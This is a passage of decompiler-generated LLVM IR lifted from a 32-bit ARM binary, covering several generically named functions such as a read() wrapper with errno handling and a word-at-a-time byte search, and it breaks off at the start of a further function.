  %v5_148f4 = inttoptr i32 %v4_148f4 to i8*
  %v6_148f4 = load i8, i8* %v5_148f4, align 1
  %v8_148f4 = zext i8 %v6_148f4 to i32
  store i32 %v8_148f4, i32* %r3.global-to-local, align 4
  %v1_148f8 = and i32 %v8_148f4, 32
  %v2_148f8 = icmp eq i32 %v1_148f8, 0
  br i1 %v2_148f8, label %dec_label_pc_148dc, label %dec_label_pc_14900.loopexit

dec_label_pc_14900.loopexit:                      ; preds = %dec_label_pc_148ec, %dec_label_pc_148dc, %dec_label_pc_148e0.preheader
  %v0_14900 = phi i32 [ %v0_148e025, %dec_label_pc_148e0.preheader ], [ %v0_148dc, %dec_label_pc_148ec ], [ %v1_148dc, %dec_label_pc_148dc ]
  %v1_14900 = inttoptr i32 %v0_14900 to i8*
  %v2_14900 = load i8, i8* %v1_14900, align 1
  %v3_14900 = zext i8 %v2_14900 to i32
  store i32 %v3_14900, i32* %r3.global-to-local, align 4
  %v2_14904 = icmp eq i8 %v2_14900, 0
  br i1 %v2_14904, label %dec_label_pc_1490c, label %dec_label_pc_148ac.preheader

dec_label_pc_148ac.preheader:                     ; preds = %dec_label_pc_14900.preheader, %dec_label_pc_14900.loopexit
  %v0_148ac20 = phi i32 [ %v0_14900, %dec_label_pc_14900.loopexit ], [ %v0_1490030, %dec_label_pc_14900.preheader ]
  %v1_148ac21 = inttoptr i32 %v0_148ac20 to i8*
  %v2_148ac22 = load i8, i8* %v1_148ac21, align 1
  %v3_148ac23 = zext i8 %v2_148ac22 to i32
  store i32 %v3_148ac23, i32* %r1.global-to-local, align 4
  %v2_148b024 = icmp eq i8 %v2_148ac22, 0
  br i1 %v2_148b024, label %dec_label_pc_1490c, label %dec_label_pc_148b8

dec_label_pc_1490c:                               ; preds = %dec_label_pc_14900.loopexit, %dec_label_pc_148ac.preheader, %dec_label_pc_148a4, %dec_label_pc_14900.preheader
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_14910 = load i32, i32* @r6, align 4
  %v1_14914 = load i32, i32* @r4, align 4
  %v5_14914 = mul i32 %v0_14910, 4
  %v6_14914 = add i32 %v1_14914, %v5_14914
  %v7_14914 = inttoptr i32 %v6_14914 to i32*
  store i32 0, i32* %v7_14914, align 4
  %v7_14918 = icmp sgt i32 %v0_14910, 1
  br i1 %v7_14918, label %dec_label_pc_1491c, label %dec_label_pc_149c0

dec_label_pc_1491c:                               ; preds = %dec_label_pc_1490c
  %v2_1491c = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_1491c, i32* %r0.global-to-local, align 4
  %v7_14920 = icmp eq i32 %v2_1491c, 1
  br i1 %v7_14920, label %dec_label_pc_149f4, label %dec_label_pc_14928

dec_label_pc_14928:                               ; preds = %dec_label_pc_1491c
  %v7_14928 = icmp eq i32 %v2_1491c, 2
  br i1 %v7_14928, label %dec_label_pc_14934, label %dec_label_pc_14960.preheader

dec_label_pc_14960.preheader:                     ; preds = %dec_label_pc_14928
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_14960

dec_label_pc_14934:                               ; preds = %dec_label_pc_14928
  store i32 %v0_146f8, i32* %r0.global-to-local, align 4
  %v0_14938 = load i32, i32* @r4, align 4
  %v1_14938 = inttoptr i32 %v0_14938 to i32*
  %v2_14938 = load i32, i32* %v1_14938, align 4
  store i32 %v2_14938, i32* @r1, align 4
  %v3_1493c = call i32 @function_f010(i8* %v2_1493c, i32 %v2_14938)
  store i32 %v3_1493c, i32* %r0.global-to-local, align 4
  %v2_14940 = icmp eq i32 %v3_1493c, 0
  br i1 %v2_14940, label %dec_label_pc_14970, label %dec_label_pc_149c0

dec_label_pc_1494c:                               ; preds = %dec_label_pc_14960
  %v0_1494c = load i32, i32* @r4, align 4
  %v4_1494c = mul i32 %v1_1494c, 4
  %v5_1494c = add i32 %v0_1494c, %v4_1494c
  %v6_1494c = inttoptr i32 %v5_1494c to i32*
  %v7_1494c = load i32, i32* %v6_1494c, align 4
  store i32 %v7_1494c, i32* %r1.global-to-local, align 4
  %v3_14950 = call i32 @function_f464(i8* %v2_1493c, i32 %v7_1494c)
  store i32 %v3_14950, i32* %r0.global-to-local, align 4
  %v2_14954 = icmp eq i32 %v3_14950, 0
  %v0_14958 = load i32, i32* @r5, align 4
  %v1_14958 = add i32 %v0_14958, 1
  store i32 %v1_14958, i32* @r5, align 4
  br i1 %v2_14954, label %dec_label_pc_14970, label %dec_label_pc_14960

dec_label_pc_14960:                               ; preds = %dec_label_pc_14960.preheader, %dec_label_pc_1494c
  %v1_1494c = phi i32 [ 1, %dec_label_pc_14960.preheader ], [ %v1_14958, %dec_label_pc_1494c ]
  %v1_14960 = load i32, i32* @r6, align 4
  store i32 %v0_146f8, i32* %r0.global-to-local, align 4
  %v5_14968 = icmp slt i32 %v1_1494c, %v1_14960
  br i1 %v5_14968, label %dec_label_pc_1494c, label %dec_label_pc_149c0

dec_label_pc_14970:                               ; preds = %dec_label_pc_1494c, %dec_label_pc_14934
  store i32 %v0_146f0, i32* %r1.global-to-local, align 4
  br i1 %v7_14974, label %dec_label_pc_1497c, label %dec_label_pc_14998

dec_label_pc_1497c:                               ; preds = %dec_label_pc_14970
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_14980 = load i32, i32* @r7, align 4
  store i32 %v0_14980, i32* %r2.global-to-local, align 4
  %v0_14984 = load i32, i32* @r4, align 4
  %v1_14984 = inttoptr i32 %v0_14984 to i32*
  %v2_14984 = load i32, i32* %v1_14984, align 4
  store i32 %v2_14984, i32* %r1.global-to-local, align 4
  %v3_14988 = inttoptr i32 %v2_14984 to i8*
  %v4_14988 = call i32 @function_13de8(i32 2, i8* %v3_14988, i32 %v0_14980)
  store i32 %v4_14988, i32* %r0.global-to-local, align 4
  %v5_14990 = icmp sgt i32 %v4_14988, 0
  br i1 %v5_14990, label %dec_label_pc_147cc, label %dec_label_pc_149bc

dec_label_pc_14998:                               ; preds = %dec_label_pc_14970
  store i32 %v0_146f0, i32* %r2.global-to-local, align 4
  br i1 %v7_1499c, label %dec_label_pc_149a4, label %dec_label_pc_149bc

dec_label_pc_149a4:                               ; preds = %dec_label_pc_14998
  store i32 10, i32* %r0.global-to-local, align 4
  %v0_149a8 = load i32, i32* @r4, align 4
  %v1_149a8 = inttoptr i32 %v0_149a8 to i32*
  %v2_149a8 = load i32, i32* %v1_149a8, align 4
  store i32 %v2_149a8, i32* %r1.global-to-local, align 4
  store i32 %v0_14874, i32* %r2.global-to-local, align 4
  %v3_149b0 = inttoptr i32 %v2_149a8 to i8*
  %v4_149b0 = call i32 @function_13de8(i32 10, i8* %v3_149b0, i32 %v0_14874)
  store i32 %v4_149b0, i32* %r0.global-to-local, align 4
  %v5_149b8 = icmp sgt i32 %v4_149b0, 0
  br i1 %v5_149b8, label %dec_label_pc_14810, label %dec_label_pc_149bc

dec_label_pc_149bc:                               ; preds = %dec_label_pc_1497c, %dec_label_pc_14998, %dec_label_pc_149a4
  store i32 2, i32* @sl, align 4
  br label %dec_label_pc_149c0

dec_label_pc_149c0:                               ; preds = %dec_label_pc_14960, %dec_label_pc_14934, %dec_label_pc_1490c, %dec_label_pc_149bc, %dec_label_pc_14868
  %v0_149c0 = load i32, i32* @fp, align 4
  store i32 %v0_149c0, i32* %r0.global-to-local, align 4
  %v0_149c4 = load i32, i32* @r8, align 4
  store i32 %v0_149c4, i32* %r1.global-to-local, align 4
  store i32 %stack_var_-52.0, i32* %r2.global-to-local, align 4
  %v3_149cc = call i32 @function_e7bc(i32 %v0_149c0, i32 %v0_149c4, i32 %stack_var_-52.0)
  store i32 %v3_149cc, i32* %r0.global-to-local, align 4
  %v2_149d0 = icmp eq i32 %v3_149cc, 0
  br i1 %v2_149d0, label %dec_label_pc_149d8, label %dec_label_pc_14880

dec_label_pc_149d8:                               ; preds = %dec_label_pc_149c0, %dec_label_pc_14810, %dec_label_pc_147cc
  %v2_149d8 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_149d8, i32* %r3.global-to-local, align 4
  %v7_149dc = icmp eq i32 %v2_149d8, 1
  br i1 %v7_149dc, label %dec_label_pc_149f4, label %dec_label_pc_149e4

dec_label_pc_149e4:                               ; preds = %dec_label_pc_149d8
  store i32 %stack_var_-52.0, i32* %r0.global-to-local, align 4
  %v1_149e8 = inttoptr i32 %stack_var_-52.0 to i8*
  %v2_149e8 = call i32 @function_ced0(i8* %v1_149e8)
  store i32 %v2_149e8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_149f4

dec_label_pc_149f0:                               ; preds = %dec_label_pc_1470c, %bb74, %dec_label_pc_14760, %dec_label_pc_14758, %dec_label_pc_1474c, %dec_label_pc_14738, %dec_label_pc_1471c
  store i32 34, i32* @sl, align 4
  br label %dec_label_pc_149f4

dec_label_pc_149f4:                               ; preds = %dec_label_pc_1491c, %dec_label_pc_149d8, %dec_label_pc_149e4, %dec_label_pc_147b4, %dec_label_pc_149f0
  %v0_149f4 = load i32, i32* @sl, align 4
  store i32 %v0_149f4, i32* %r0.global-to-local, align 4
  store i32 %v3_146dc, i32* @r4, align 4
  store i32 %v6_146dc, i32* @r5, align 4
  store i32 %v12_146dc, i32* @r7, align 4
  store i32 %v15_146dc, i32* @r8, align 4
  store i32 %v21_146dc, i32* @sl, align 4
  store i32 %v24_146dc, i32* @fp, align 4
  ret i32 %v0_149f4

; uselistorder directives
  uselistorder i32 %v1_1494c, { 1, 0 }
  uselistorder i32 %v0_14910, { 1, 0 }
  uselistorder i32 %v3_148ac23, { 1, 0 }
  uselistorder i32 %v0_148ac20, { 1, 0 }
  uselistorder i32 %v2_14888, { 1, 0, 2 }
  uselistorder i32 %stack_var_-52.0, { 1, 0, 3, 2 }
  uselistorder i32 %stack_var_-40.1, { 1, 0 }
  uselistorder i32 %v0_14788, { 1, 0 }
  uselistorder i32 %v0_1474c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_14730, { 1, 0 }
  uselistorder i32 %v0_146fc, { 1, 0, 2 }
  uselistorder i32 %v0_146f0, { 0, 2, 1, 3 }
  uselistorder i32 %v1_146ec, { 4, 2, 3, 1, 0 }
  uselistorder i32 %tmp61, { 1, 0, 3, 2 }
  uselistorder i32 %tmp57, { 0, 2, 3, 1 }
  uselistorder i32 %tmp56, { 3, 0, 1, 2 }
  uselistorder i32 %tmp53, { 0, 4, 3, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 0, 10, 16, 11, 12, 13, 14, 15, 24, 17, 18, 1, 2, 3, 4, 5, 6, 7, 8, 9, 19, 20, 21, 22, 23 }
  uselistorder i32* %r2.global-to-local, { 13, 3, 4, 8, 9, 19, 10, 18, 11, 12, 20, 0, 1, 2, 5, 6, 7, 14, 16, 15, 17 }
  uselistorder i32* %r1.global-to-local, { 11, 2, 5, 6, 7, 14, 8, 13, 9, 10, 0, 1, 3, 4, 12 }
  uselistorder i32* %r0.global-to-local, { 0, 5, 1, 21, 20, 11, 6, 13, 12, 14, 24, 17, 15, 16, 19, 18, 2, 3, 4, 7, 8, 9, 10, 23, 22, 25 }
  uselistorder i32* %ip.global-to-local, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 34, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 (i8*)* @function_ced0, { 5, 6, 3, 4, 0, 1, 2, 7, 8 }
  uselistorder i32 (i32, i32, i32)* @function_e7bc, { 4, 3, 0, 5, 2, 1 }
  uselistorder i32 (i8*, i32)* @function_f464, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder i32 (i8*, i32)* @function_f010, { 1, 2, 3, 4, 0 }
  uselistorder i32 7, { 2, 10, 11, 4, 5, 6, 0, 7, 14, 13, 1, 8, 9, 12, 3 }
  uselistorder i32* @global_var_18428, { 0, 6, 2, 7, 1, 3, 4, 8, 5 }
  uselistorder i32 10, { 5, 6, 34, 7, 8, 35, 36, 37, 38, 39, 26, 14, 27, 13, 28, 29, 15, 30, 31, 40, 4, 41, 42, 43, 44, 12, 16, 46, 17, 47, 48, 18, 49, 19, 20, 0, 9, 10, 21, 24, 25, 3, 45, 50, 11, 1, 32, 22, 33, 2, 23 }
  uselistorder i32 12, { 31, 32, 33, 0, 34, 7, 35, 19, 12, 13, 3, 36, 14, 10, 66, 67, 68, 69, 70, 71, 11, 72, 73, 74, 75, 76, 77, 15, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 5, 4, 53, 54, 55, 16, 20, 26, 65, 57, 58, 59, 1, 21, 60, 8, 61, 9, 22, 2, 62, 17, 37, 38, 39, 40, 78, 6, 41, 56, 63, 64, 18, 25, 23, 24, 27, 28, 29, 30, 42 }
  uselistorder i32* @sb, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 1, 2, 15, 16, 17, 18, 19, 20, 21, 22, 23, 30, 31, 24, 25, 26, 27, 28, 29, 32, 33, 34, 35, 36, 37, 0, 38 }
  uselistorder i32 80, { 0, 4, 5, 6, 1, 7, 2, 3 }
  uselistorder i32 48, { 9, 5, 6, 7, 8, 10, 2, 11, 12, 13, 3, 4, 14, 15, 16, 18, 17, 1, 0, 19 }
  uselistorder i32 36, { 4, 5, 6, 7, 8, 9, 10, 3, 1, 14, 2, 0, 11, 12, 13 }
  uselistorder i32 56, { 3, 5, 6, 2, 4, 7, 1, 0, 8, 9 }
  uselistorder i32 44, { 3, 4, 5, 7, 8, 11, 1, 2, 9, 6, 0, 10 }
  uselistorder i32 -48, { 2, 3, 0, 4, 5, 6, 7, 1 }
  uselistorder i32 -32, { 1, 5, 2, 6, 7, 3, 0, 4 }
  uselistorder i32 32, { 30, 31, 32, 0, 33, 34, 26, 4, 3, 6, 5, 8, 7, 35, 36, 22, 23, 20, 37, 24, 38, 39, 29, 1, 15, 21, 48, 49, 50, 40, 16, 41, 2, 25, 42, 43, 44, 45, 46, 17, 47, 27, 28, 51, 52, 53, 54, 10, 9, 12, 11, 18, 19, 14, 13 }
  uselistorder i32* @fp, { 27, 30, 28, 1, 29, 31, 32, 33, 34, 0, 36, 35, 37, 38, 39, 52, 2, 40, 41, 42, 43, 44, 45, 46, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 3, 4, 5, 6, 7, 8, 9, 10, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 47, 48, 68, 69, 70, 71, 49, 50, 51, 65, 66, 67, 11, 12, 13 }
  uselistorder i32* @sl, { 5, 6, 7, 8, 11, 9, 10, 12, 13, 14, 15, 16, 17, 18, 2, 3, 19, 20, 0, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 52, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 4, 53, 54, 55, 56, 57, 58, 59, 1, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69 }
  uselistorder i32* @r8, { 13, 14, 15, 16, 17, 18, 19, 3, 4, 5, 20, 21, 22, 0, 23, 24, 25, 26, 27, 1, 28, 29, 30, 31, 38, 39, 89, 91, 90, 8, 9, 10, 11, 12, 50, 32, 33, 34, 35, 36, 37, 40, 41, 42, 43, 44, 45, 6, 7, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 2, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 46, 47, 48, 49, 85, 86, 87, 88 }
  uselistorder i32* @r7, { 38, 40, 41, 39, 42, 43, 44, 45, 46, 47, 6, 7, 8, 9, 10, 11, 12, 1, 48, 50, 49, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 78, 79, 80, 81, 112, 13, 14, 2, 15, 16, 19, 20, 21, 22, 23, 24, 25, 26, 27, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 82, 83, 84, 85, 28, 29, 30, 31, 101, 3, 102, 103, 4, 5, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 0, 17, 18, 110, 111, 37, 97, 98, 99, 100, 104, 105, 106, 107, 108, 109, 32, 33, 34, 35, 36 }
  uselistorder label %dec_label_pc_149f4, { 4, 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_149f0, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_149c0, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_149bc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14960, { 1, 0 }
  uselistorder label %dec_label_pc_1490c, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_148ac.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_148ec, { 1, 0 }
  uselistorder label %dec_label_pc_14868, { 1, 0 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %dec_label_pc_1471c, { 1, 0 }
}

define i32 @function_14a04(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_14a04:
  %r4.global-to-local = alloca i32, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_14a48, label %dec_label_pc_14a34

dec_label_pc_14a34:                               ; preds = %dec_label_pc_14a04
  %v0_14a34 = call i32 @function_cec4()
  %v0_14a38 = load i32, i32* %r4.global-to-local, align 4
  %v1_14a38 = sub i32 0, %v0_14a38
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_14a40 = inttoptr i32 %v0_14a34 to i32*
  store i32 %v1_14a38, i32* %v2_14a40, align 4
  %v0_14a50.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14a50

dec_label_pc_14a48:                               ; preds = %dec_label_pc_14a04
  %v2_14a48 = icmp eq i32 %arg1, 0
  br i1 %v2_14a48, label %dec_label_pc_14a5c, label %dec_label_pc_14a50

dec_label_pc_14a50:                               ; preds = %dec_label_pc_14a48, %dec_label_pc_14a34
  %v0_14a50 = phi i32 [ %arg1, %dec_label_pc_14a48 ], [ %v0_14a50.pre, %dec_label_pc_14a34 ]
  br label %dec_label_pc_14a60

dec_label_pc_14a5c:                               ; preds = %dec_label_pc_14a48
  br label %dec_label_pc_14a60

dec_label_pc_14a60:                               ; preds = %dec_label_pc_14a50, %dec_label_pc_14a5c
  %v14_14a64 = phi i32 [ %v0_14a50, %dec_label_pc_14a50 ], [ %tmp9, %dec_label_pc_14a5c ]
  ret i32 %v14_14a64

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_14a60, { 1, 0 }
}

define i32 @function_14a68(i32 %arg1) local_unnamed_addr {
dec_label_pc_14a68:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14a68 = load i32, i32* @r4, align 4
  store i32 %v3_14a68, i32* %stack_var_-8, align 4
  %v1_14a6c = load i32, i32* @r1, align 4
  %v2_14a6c = inttoptr i32 %v1_14a6c to i32*
  %v3_14a6c = load i32, i32* @r2, align 4
  %v4_14a6c = call i32 @read(i32 %arg1, i32* %v2_14a6c, i32 %v3_14a6c)
  store i32 %v4_14a6c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_14a6c, -4095
  br i1 %tmp, label %dec_label_pc_14a8c, label %dec_label_pc_14a7c

dec_label_pc_14a7c:                               ; preds = %dec_label_pc_14a68
  %v0_14a7c = call i32 @function_cec4()
  %v0_14a80 = load i32, i32* %r4.global-to-local, align 4
  %v1_14a80 = sub i32 0, %v0_14a80
  %v2_14a84 = inttoptr i32 %v0_14a7c to i32*
  store i32 %v1_14a80, i32* %v2_14a84, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14a8c

dec_label_pc_14a8c:                               ; preds = %dec_label_pc_14a68, %dec_label_pc_14a7c
  %v0_14a8c = phi i32 [ %v4_14a6c, %dec_label_pc_14a68 ], [ -1, %dec_label_pc_14a7c ]
  %v2_14a90 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14a90, i32* @r4, align 4
  ret i32 %v0_14a8c

; uselistorder directives
  uselistorder i32 %v4_14a6c, { 1, 0, 2 }
  uselistorder i32 ()* @function_cec4, { 22, 37, 46, 71, 70, 41, 45, 21, 36, 35, 44, 61, 20, 43, 42, 34, 33, 60, 12, 11, 59, 10, 53, 9, 8, 7, 6, 58, 57, 5, 4, 3, 72, 52, 51, 50, 49, 40, 39, 19, 32, 66, 48, 31, 30, 25, 29, 28, 38, 27, 26, 17, 1, 18, 13, 56, 55, 54, 0, 47, 24, 15, 2, 69, 14, 68, 67, 23, 16, 65, 64, 63, 62 }
  uselistorder label %dec_label_pc_14a8c, { 1, 0 }
}

define i32 @function_14a94(i32 %arg1) local_unnamed_addr {
dec_label_pc_14a94:
  %v1_14a9c = icmp slt i32 %arg1, 0
  br i1 %v1_14a9c, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_14a94
  ret i32 %arg1

bb1:                                              ; preds = %dec_label_pc_14a94
  %v2_14a9c = mul i32 %arg1, 2
  %v2_14aa8 = load i32, i32* bitcast (i32** @global_var_18430.419 to i32*), align 4
  %v2_14aac = add i32 %v2_14aa8, %v2_14a9c
  %v3_14ab0 = inttoptr i32 %v2_14aac to i8*
  %v4_14ab0 = load i8, i8* %v3_14ab0, align 1
  %v6_14ab0 = zext i8 %v4_14ab0 to i32
  %v1_14ab4 = add i32 %v2_14aac, 1
  %v2_14ab4 = inttoptr i32 %v1_14ab4 to i8*
  %v3_14ab4 = load i8, i8* %v2_14ab4, align 1
  %v4_14ab4 = zext i8 %v3_14ab4 to i32
  %v3_14ab8 = mul nuw i32 %v4_14ab4, 16777216
  %v4_14abc = sdiv i32 %v3_14ab8, 65536
  %v5_14abc = or i32 %v4_14abc, %v6_14ab0
  ret i32 %v5_14abc

; uselistorder directives
  uselistorder i32 %v2_14aac, { 1, 0 }
}

define i32 @function_14ac8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_14ac8:
  %v6_14ac8 = load i32, i32* @r5, align 4
  %v9_14ac8 = load i32, i32* @r6, align 4
  %v1_14acc = urem i32 %arg1, 256
  br label %dec_label_pc_14aec

dec_label_pc_14ad4:                               ; preds = %dec_label_pc_14aec
  %v3_14ad4 = load i8, i8* %.0, align 1
  %v4_14ad4 = zext i8 %v3_14ad4 to i32
  %v9_14ad8 = icmp eq i32 %v4_14ad4, %v1_14acc
  br i1 %v9_14ad8, label %bb, label %bb24

bb:                                               ; preds = %dec_label_pc_14ad4
  ret i32 %v1_14aec

bb24:                                             ; preds = %dec_label_pc_14ad4
  %v2_14ae0 = icmp eq i8 %v3_14ad4, 0
  %v2_14ae4 = add i32 %v1_14aec, 1
  %v3_14ae4 = inttoptr i32 %v2_14ae4 to i8*
  br i1 %v2_14ae0, label %dec_label_pc_14bc0, label %dec_label_pc_14aec

dec_label_pc_14aec:                               ; preds = %bb24, %dec_label_pc_14ac8
  %.0 = phi i8* [ undef, %dec_label_pc_14ac8 ], [ %v3_14ae4, %bb24 ]
  %v1_14aec = ptrtoint i8* %.0 to i32
  %v2_14aec = urem i32 %v1_14aec, 4
  %v3_14aec = icmp eq i32 %v2_14aec, 0
  br i1 %v3_14aec, label %dec_label_pc_14af4, label %dec_label_pc_14ad4

dec_label_pc_14af4:                               ; preds = %dec_label_pc_14aec
  %v4_14af4 = mul nuw nsw i32 %v1_14acc, 256
  %v5_14af4 = or i32 %v4_14af4, %v1_14acc
  %v4_14afc = mul i32 %v5_14af4, 65536
  %v5_14afc = or i32 %v4_14afc, %v5_14af4
  br label %dec_label_pc_14b00

dec_label_pc_14b00:                               ; preds = %dec_label_pc_14bb8, %dec_label_pc_14b40, %dec_label_pc_14af4
  %v0_14b64 = phi i32 [ %v1_14aec, %dec_label_pc_14af4 ], [ %v4_14b00, %dec_label_pc_14b40 ], [ %v4_14b00, %dec_label_pc_14bb8 ]
  %v1_14b00 = inttoptr i32 %v0_14b64 to i32*
  %v2_14b00 = load i32, i32* %v1_14b00, align 4
  %v4_14b00 = add i32 %v0_14b64, 4
  %v2_14b08 = xor i32 %v2_14b00, %v5_14afc
  %v2_14b14 = add i32 %v2_14b00, 2130640639
  %v1_14b18 = sub i32 -1, %v2_14b00
  %v2_14b1c = xor i32 %v2_14b14, %v1_14b18
  %v2_14b20 = add i32 %v2_14b08, 2130640639
  %v1_14b28 = sub i32 -1, %v2_14b08
  %v2_14b2c = and i32 %v2_14b1c, -2130640640
  %v2_14b30 = xor i32 %v2_14b20, %v1_14b28
  %v2_14b34 = icmp eq i32 %v2_14b2c, 0
  %v2_14b38 = and i32 %v2_14b30, -2130640640
  store i32 %v2_14b38, i32* @lr, align 4
  br i1 %v2_14b34, label %dec_label_pc_14b40, label %dec_label_pc_14b48

dec_label_pc_14b40:                               ; preds = %dec_label_pc_14b00
  %v2_14b40 = icmp eq i32 %v2_14b38, 0
  br i1 %v2_14b40, label %dec_label_pc_14b00, label %dec_label_pc_14b48

dec_label_pc_14b48:                               ; preds = %dec_label_pc_14b00, %dec_label_pc_14b40
  %v2_14b48 = inttoptr i32 %v0_14b64 to i8*
  %v3_14b48 = load i8, i8* %v2_14b48, align 1
  %v4_14b48 = zext i8 %v3_14b48 to i32
  %v1_14b50 = add i32 %v0_14b64, 1
  %v1_14b54 = add i32 %v0_14b64, 2
  %v9_14b58 = icmp eq i32 %v4_14b48, %v1_14acc
  %v1_14b5c = add i32 %v0_14b64, 3
  br i1 %v9_14b58, label %dec_label_pc_14b64, label %dec_label_pc_14b6c

dec_label_pc_14b64:                               ; preds = %dec_label_pc_14b48
  store i32 %v6_14ac8, i32* @r5, align 4
  store i32 %v9_14ac8, i32* @r6, align 4
  ret i32 %v0_14b64

dec_label_pc_14b6c:                               ; preds = %dec_label_pc_14b48
  %v2_14b6c = icmp eq i8 %v3_14b48, 0
  br i1 %v2_14b6c, label %dec_label_pc_14bc0, label %dec_label_pc_14b74

dec_label_pc_14b74:                               ; preds = %dec_label_pc_14b6c
  %v2_14b74 = inttoptr i32 %v1_14b50 to i8*
  %v3_14b74 = load i8, i8* %v2_14b74, align 1
  %v4_14b74 = zext i8 %v3_14b74 to i32
  %v9_14b78 = icmp eq i32 %v4_14b74, %v1_14acc
  br i1 %v9_14b78, label %bb25, label %bb26

bb25:                                             ; preds = %dec_label_pc_14b74
  store i32 %v6_14ac8, i32* @r5, align 4
  store i32 %v9_14ac8, i32* @r6, align 4
  ret i32 %v1_14b50

bb26:                                             ; preds = %dec_label_pc_14b74
  %v2_14b80 = icmp eq i8 %v3_14b74, 0
  br i1 %v2_14b80, label %dec_label_pc_14bc0, label %dec_label_pc_14b88

dec_label_pc_14b88:                               ; preds = %bb26
  %v2_14b88 = inttoptr i32 %v1_14b54 to i8*
  %v3_14b88 = load i8, i8* %v2_14b88, align 1
  %v4_14b88 = zext i8 %v3_14b88 to i32
  %v9_14b8c = icmp eq i32 %v4_14b88, %v1_14acc
  br i1 %v9_14b8c, label %dec_label_pc_14b94, label %dec_label_pc_14b9c

dec_label_pc_14b94:                               ; preds = %dec_label_pc_14b88
  store i32 %v6_14ac8, i32* @r5, align 4
  store i32 %v9_14ac8, i32* @r6, align 4
  ret i32 %v1_14b54

dec_label_pc_14b9c:                               ; preds = %dec_label_pc_14b88
  %v2_14b9c = icmp eq i8 %v3_14b88, 0
  br i1 %v2_14b9c, label %dec_label_pc_14bc0, label %dec_label_pc_14ba4

dec_label_pc_14ba4:                               ; preds = %dec_label_pc_14b9c
  %v2_14ba4 = inttoptr i32 %v1_14b5c to i8*
  %v3_14ba4 = load i8, i8* %v2_14ba4, align 1
  %v4_14ba4 = zext i8 %v3_14ba4 to i32
  %v9_14ba8 = icmp eq i32 %v4_14ba4, %v1_14acc
  br i1 %v9_14ba8, label %dec_label_pc_14bb0, label %dec_label_pc_14bb8

dec_label_pc_14bb0:                               ; preds = %dec_label_pc_14ba4
  store i32 %v6_14ac8, i32* @r5, align 4
  store i32 %v9_14ac8, i32* @r6, align 4
  ret i32 %v1_14b5c

dec_label_pc_14bb8:                               ; preds = %dec_label_pc_14ba4
  %v2_14bb8 = icmp eq i8 %v3_14ba4, 0
  br i1 %v2_14bb8, label %dec_label_pc_14bc0, label %dec_label_pc_14b00

dec_label_pc_14bc0:                               ; preds = %bb24, %dec_label_pc_14bb8, %dec_label_pc_14b9c, %bb26, %dec_label_pc_14b6c
  store i32 %v6_14ac8, i32* @r5, align 4
  store i32 %v9_14ac8, i32* @r6, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_14b00, { 1, 0 }
  uselistorder i32 %v2_14b00, { 0, 2, 1 }
  uselistorder i32 %v0_14b64, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_14af4, { 1, 0 }
  uselistorder i32 %v1_14aec, { 1, 0, 2, 3 }
  uselistorder i8* %.0, { 1, 0 }
  uselistorder i32 %v1_14acc, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 %v9_14ac8, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v6_14ac8, { 3, 0, 1, 2, 4 }
  uselistorder i32 -2130640640, { 2, 5, 6, 7, 3, 0, 8, 4, 1 }
  uselistorder i32 2130640639, { 1, 2, 5, 6, 3, 0, 4 }
  uselistorder i8* undef, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14bc0, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_14b48, { 1, 0 }
}

define i32 @function_14bd0(i8* %arg1) local_unnamed_addr {
dec_label_pc_14bd0:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
